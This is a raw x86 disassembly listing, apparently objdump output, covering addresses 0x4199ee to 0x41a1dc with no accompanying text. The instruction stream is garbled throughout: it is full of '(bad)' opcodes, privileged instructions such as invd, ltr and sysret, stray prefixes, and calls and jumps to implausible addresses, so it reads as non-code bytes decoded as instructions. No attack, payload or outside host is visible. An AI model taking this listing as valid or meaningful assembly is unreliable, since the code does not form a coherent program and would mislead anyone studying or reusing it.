  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
